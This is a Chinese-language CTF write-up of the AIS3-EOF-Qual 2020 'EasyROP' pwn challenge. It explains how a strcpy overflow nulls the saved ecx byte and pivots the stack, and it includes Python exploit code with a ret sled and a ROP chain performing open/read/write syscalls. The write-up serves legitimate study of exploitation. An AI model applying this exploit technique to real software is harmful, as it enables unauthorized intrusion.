AIS3-EOF-Qual 2020 - [Pwn] EasyROP
===
- [Description](#Description)
- [Begin & End of main](#Begin-amp-End-of-main)
- [Vulnerability](#Vulnerability)
- [Exploit](#Exploit)
- [Other](#Other)
- [Reference](#Reference)

# Description
![](https://i.imgur.com/uqyA7iZ.png)

出題者給了 Docker, 上面運行著 EasyRop, 並要先通過 pow 才能打

攻擊腳本跟這篇 Write up 忽略 pow 的部分
    
# Begin & End of main
```c
lea     ecx, [esp+4]
and     esp, 0FFFFFFF0h
push    dword ptr [ecx-4]
push    ebp
mov     ebp, esp
push    edi
push    esi
push    ebx
push    ecx

...

mov     eax, 0
mov     esp, esi
lea     esp, [ebp-10h]
pop     ecx
pop     ebx
pop     esi
pop     edi
pop     ebp
lea     esp, [ecx-4]
retn
```
這跟常見的 function 長得不太一樣, 這邊來了解看看他

經過實測後, 發現進到 main 時 esp 的值都是 0xXXXXXXXc

以下假設是 0xffbebc2c

而 0xffbebc2c 指向 `__libc_start_main+241`, 也就是 return address

執行完 main 後會跳回這地方

以下分成幾個部分講解
```
lea     ecx, [esp+4]
and     esp, 0FFFFFFF0h
push    dword ptr [ecx-4]
```
ecx 變成 0xffbebc30

esp 變成 0xffbebc20

push 後, esp 變成 0xffbebc1c, 0xffbebc1c 會指向 `__libc_start_main+241`

```
push    ebp
mov     ebp, esp
push    edi
push    esi
push    ebx
push    ecx
```
前兩行是正常 function 會有的東西

push ebp 後, esp 變成 0xffbebc18, 上面存放著 old ebp

ebp 變成 0xffbebc18

後四行存暫存器的值到 stack 上

| registers  | offset | 值 |
| -------- | -------- | -------- |
| esp  |   -0x10h   | ecx     |
|      |   -0xc   | ebx     |
|      |   -0x8   | esi     |
|      |   -0x4   | edi     |
| ebp  |   0   | old ebp     |
|      |   0x4   | return address     |


當 function 要 return 0 時

```
mov     eax, 0
```
表示 return 0

```
mov     esp, esi
lea     esp, [ebp-10h]
```
這兩行最終有效的只有第二行, 第一行應該只是上個指令編出來的產物(總之不用管)

```
pop     ecx
pop     ebx
pop     esi
pop     edi
pop     ebp
lea     esp, [ecx-4]
retn
```
全部照順序 pop 回來

並且將 esp 恢復到正確的位置後才 ret

# Vulnerability
參考反編譯出來的 [main.c](#) 以及如下的 memory 配置圖

![](https://i.imgur.com/nM4GSXQ.png)

好像太醜了，其實也可以只看 c 就好

```c
  strcpy((char *)&v6, (const char *)s);
  strcpy((char *)s, &buf);
  strcpy(&buf, dest);
```
(第一個的 &v6 實際上就是 dest)

若 s, buf 都放了 0x40 Bytes, 那
1. 從 s 放到 dest 0x40 Bytes
2. 從 buf 放到 s 0x40 Bytes
3. **從 dest 放到 buf 時, 會放 0x80 Bytes**
    - **因為此時 dest 會是有 0x80 Bytes 的區間都沒有 null byte !!**
    - strcpy 放了 0x80 Bytes 後, 後面再加上 null byte
    - **就把 old ecx 的最後一 byte 蓋成 0x00 !**

最後 return 時 esp 會變成 ecx - 4 再 return, 以下分兩種狀況
- old ecx 最後一 byte 本來就是 0x00
    - 以上圖來說, old ecx 會等於 0xFFFFD600
    - 沒有影響, 程式正確執行
- **最後一 byte 不是 0x00**
    - **跳到前面 dest, s, buf 區間**
    - 因為 ASLR, 所以無法預測準確會跳到哪

# Exploit
```python
buf = 0x804a210
size = 0x01010101
payload = p32(ret)*0xb
payload += p32(pop_ebp)
payload += p32(buf+0x24)
payload += p32(0x8048775) # push 0, call read
payload += p32(buf)
payload += p32(size) # back to main, call read(0, buf, size)
assert len(payload) == 0x40
send(payload)

payload = p32(ret)*0x10
assert len(payload) == 0x40
send(payload)
```
根據前面說的, 輸入兩次 0x40 bytes 長的咚咚

ecx 最後一 byte 被蓋成 0x00, 導致 esp 指向到 dest s buf 區間(但不知準確位置)

而這個位置只有 20 bytes 是主要一定要被執行到的 gadget

在這 20 bytes 前都塞入單純 ret 的 gadget

就能提高有執行到那 20 bytes 的機率

而這 gadget 功能主要是執行 `read(0, buf, size)`

```python
# Now we have a beautiful rop environment
buf2 = buf+0xb00
# copy syscall gadget:
#   __GI___libc_read+0x20: call   DWORD PTR gs:0x10
#   (call __kernel_vsyscall)
rop = flat(
        strcpy_plt, pop_pop, buf+0x200, d0,
        strcpy_plt, pop_pop, buf+0x201, read_got+1,
        strcpy_plt, pop_pop, buf+0x204, null_buf,
        strcpy_plt, pop_pop, buf+0x300, buf+0x200,
        strcpy_plt, pop_pop, buf+0x400, buf+0x200,
        strcpy_plt, pop_pop, buf+0x500, buf+0x200)
rop += flat(
        read_plt, pop_pop_pop, 0, buf+0x208, len(filename),
        read_plt, pop_pop_pop, 0, buf+0x300-0x24, 0x24,
        read_plt, pop_pop_pop, 0, buf+0x300+0x20, 0x24,
        read_plt, pop_pop_pop, 0, buf+0x400-0x24, 0x24,
        read_plt, pop_pop_pop, 0, buf+0x400+0x20, 0x24,
        read_plt, pop_pop_pop, 0, buf+0x500-0x24, 0x24,
        pop_ebp, buf+0x300-0x24-0x4, leave_ret)
fakeecx = buf+0x28+0x4 # make esp point to rop chain
fakeebx = 0x03030303
fakeesi = 0x04040404
fakeedi = 0x05050505
fakeebp = buf2
payload = flat(
        buf - 0x30,
        0x01010101,
        0x01010101,
        0x01010101,
        0x01010101,
        fakeecx,
        fakeebx,
        fakeesi,
        fakeedi,
        fakeebp
        )
payload += rop
send(payload)
```
這段就是對應 `read(0, buf, size)` 的輸入

因為執行流跑到了 main 中的第二次 read, 接下來還會執行一系列 `strlen`, 3 次 `strcpy` 之類的

需要讓這些 code 安然執行到 return

最後會跳上 rop chain, 前三個 strcpy gadget 在做 `call   DWORD PTR gs:0x10` 這個 gadget

根據 Reference 6
> gs:0x10 is where libc copies the address of __kernel_vsyscall during its initialization.
> 

這咚咚效果跟用法都跟 `int 0x80` 一樣

先把這三個 gadget 安排到三個位置, 再來將準備 open read write 參數的 gadget 分別寫到這三個位置前方, 如此一來就能執行這三個 syscall

當然, 還要在這三個位置後方加上 stack pivoting 的 gadget, 才能跳到下個 gadget

```python
# popal: edi, esi, ebp, skip, 
#        ebx, edx, ecx, eax
# open
rop = flat(
        popal, 
        0, 0, buf, 0,
        buf+0x208, 0, 0, 5
        )
send(rop)
```
**popal 這個 gadget 很威猛**, 一個指令就能 pop edi, esi, ebp, esp, ebx, edx, ecx, eax

實測時會忽略 pop esp, esp 不會改變, 讓 ROP chain 不會壞掉, 讚讚

# Other
- 為何在 function call 後面會看到 `add esp`? 原因是為了對齊 16 Bytes, 而對齊這件事情跟效能有關, 舉例來說
    ```
    sub     esp, 4
    push    [ebp+nbytes]    ; nbytes
    push    eax             ; buf
    push    0               ; fd
    call    _read
    add     esp, 10h
    ```
    可以看到 `_read` 吃三個參數, 占了 12 Bytes, 為了對齊 16 Bytes, 前面會先 `sub esp, 4`, 呼叫之後直接歸還 16 Bytes 空間

# Reference
1.  https://hackmd.io/@cXpZn6ltSku4Vwx_OL0bqA/SyyxioFgI#EasyROP
2. https://reverseengineering.stackexchange.com/questions/15173/what-is-the-purpose-of-these-instructions-before-the-main-preamble
3. http://www.lenky.info/archives/2013/02/2198
4. http://articles.manugarg.com/systemcallinlinux2_6.html
5. https://lists.gt.net/linux/kernel/970025
6. https://stackoverflow.com/questions/41690592/what-does-gs0x10-do-in-assembler

###### tags: `CTF`